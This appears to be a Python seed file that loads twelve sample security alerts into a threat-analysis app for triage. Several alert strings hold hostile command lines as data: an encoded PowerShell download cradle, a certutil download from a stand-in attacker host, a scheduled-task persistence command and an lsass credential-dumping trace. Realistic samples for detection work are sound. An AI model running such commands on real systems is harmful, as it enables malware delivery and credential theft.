"""
Sample data loader: seeds the database with 12 realistic security alert examples.
Run automatically on first startup if the database is empty.
"""
from sqlalchemy.orm import Session
from app.services.analyzer import analyze_and_store

SAMPLE_ALERTS = [
    {
        "raw_input": (
            "Process Creation | Host: WORKSTATION-42 | User: jsmith | "
            "Image: powershell.exe | CommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass "
            "-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAuADEALgA1ADAALwBwAGEAeQBsAG8AYQBkACcAKQA= "
            "| ParentImage: winword.exe | Timestamp: 2024-01-15T09:23:11Z"
        ),
        "input_format": "text",
    },
    {
        "raw_input": (
            "Security Event | EventID: 4625 | Host: DC-01 | "
            "TargetUsername: administrator | FailureReason: Bad Password | "
            "SourceIP: 185.220.101.47 | LogonType: 3 | "
            "Timestamp: 2024-01-15T10:05:00Z\n"
            "Security Event | EventID: 4625 | Host: DC-01 | "
            "TargetUsername: administrator | FailureReason: Bad Password | "
            "SourceIP: 185.220.101.47 | Count: 47 failed attempts in 3 minutes"
        ),
        "input_format": "text",
    },
    {
        "raw_input": (
            '{"event_type": "user_created", "event_id": 4720, '
            '"host": "FILESERVER-01", "created_by": "DOMAIN\\\\svc_backup", '
            '"new_account": "support_temp", "timestamp": "2024-01-15T11:30:00Z", '
            '"group_memberships": ["Administrators", "Remote Desktop Users"]}'
        ),
        "input_format": "json",
    },
    {
        "raw_input": (
            "Process Creation | Host: LAPTOP-09 | User: mlopez | "
            "Image: schtasks.exe | "
            "CommandLine: schtasks /Create /SC ONLOGON /TN WindowsUpdate /TR "
            "C:\\Users\\Public\\updater.exe /RU SYSTEM | "
            "Timestamp: 2024-01-15T13:45:00Z"
        ),
        "input_format": "text",
    },
    {
        "raw_input": (
            "Sysmon Event ID 10 (ProcessAccess) | Host: WKSTN-77 | "
            "SourceImage: C:\\Windows\\Temp\\svhost.exe | "
            "TargetImage: C:\\Windows\\System32\\lsass.exe | "
            "GrantedAccess: 0x1fffff | "
            "CallTrace: C:\\Windows\\Temp\\mimikatz.exe | "
            "User: DOMAIN\\hacker | Timestamp: 2024-01-15T14:10:00Z"
        ),
        "input_format": "text",
    },
    {
        "raw_input": (
            "Process Creation | Host: WKSTN-12 | User: analyst | "
            "Image: cmd.exe | "
            "CommandLine: cmd.exe /c ipconfig /all && netstat -an && arp -a && "
            "nslookup corp.domain.local | "
            "ParentImage: explorer.exe | Timestamp: 2024-01-15T15:00:00Z"
        ),
        "input_format": "text",
    },
    {
        "raw_input": (
            "Network Connection | Host: WKSTN-33 | "
            "DestinationIP: 185.234.218.112 | DestinationPort: 4444 | "
            "SourceIP: 10.0.0.55 | Protocol: TCP | "
            "Process: powershell.exe | User: jdoe | "
            "Note: Suspicious outbound connection to known C2 IP | "
            "Timestamp: 2024-01-15T16:20:00Z"
        ),
        "input_format": "text",
    },
    {
        "raw_input": (
            "Logon Event | EventID: 4624 | LogonType: 10 (RemoteInteractive) | "
            "Host: DATACENTER-SRV | TargetUsername: dbadmin | "
            "SourceIP: 203.0.113.44 | Port: 3389 | "
            "Note: RDP login from external IP outside business hours | "
            "Timestamp: 2024-01-15T02:15:00Z"
        ),
        "input_format": "text",
    },
    {
        "raw_input": (
            "Process Creation | Host: WKSTN-21 | User: temp_user | "
            "Image: cmd.exe | "
            "CommandLine: cmd /c net user /domain && net group 'Domain Admins' /domain | "
            "ParentImage: powershell.exe | Timestamp: 2024-01-15T17:05:00Z"
        ),
        "input_format": "text",
    },
    {
        "raw_input": (
            "Process Creation | Host: WKSTN-08 | User: contractor | "
            "Image: certutil.exe | "
            "CommandLine: certutil.exe -urlcache -split -f http://evil.example.com/payload.exe "
            "C:\\Windows\\Temp\\payload.exe | "
            "Timestamp: 2024-01-15T18:00:00Z"
        ),
        "input_format": "text",
    },
    {
        "raw_input": (
            "File Execution | Host: HR-PC-05 | User: kpatel | "
            "Image: C:\\Users\\kpatel\\Downloads\\Invoice_Jan2024.exe | "
            "Hash: a1b2c3d4e5f67890abcdef1234567890 | "
            "ParentProcess: explorer.exe | "
            "ChildProcess: cmd.exe, powershell.exe | "
            "Timestamp: 2024-01-15T09:01:00Z"
        ),
        "input_format": "text",
    },
    {
        "raw_input": (
            '{"event_type": "authentication", "status": "multiple_failures", '
            '"username": "serviceaccount", "source_ip": "10.10.5.200", '
            '"destination": "EXCHANGE-01", "failure_count": 23, '
            '"timespan_minutes": 2, "reason": "password spraying detected", '
            '"timestamp": "2024-01-15T20:30:00Z"}'
        ),
        "input_format": "json",
    },
]


def seed_sample_data(db: Session) -> int:
    """
    Insert sample alerts if the database is empty.
    Returns the number of alerts inserted.
    """
    from app.models.db_models import Alert
    existing = db.query(Alert).count()
    if existing > 0:
        return 0

    count = 0
    for sample in SAMPLE_ALERTS:
        analyze_and_store(sample["raw_input"], sample["input_format"], db)
        count += 1

    return count
